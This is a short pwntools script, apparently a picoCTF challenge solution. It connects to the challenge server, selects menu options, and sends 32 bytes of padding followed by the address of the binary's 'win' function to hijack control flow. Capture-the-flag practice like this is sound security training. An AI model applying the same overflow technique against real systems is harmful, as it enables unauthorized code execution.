from pwn import *

elf = ELF('./chall')
addr_main = elf.symbols['win']

# print(p64(addr_main))

HOST = "mimas.picoctf.net"
PORT = 61438
with remote(HOST, PORT) as r:
    print(r.recv().decode())
    r.sendline(b"2")
    print(r.recv().decode())
    r.sendline(b"A" * 0x20 + p64(addr_main))
    print(r.recv().decode())
    r.sendline(b"4")
    print(r.recv().decode())
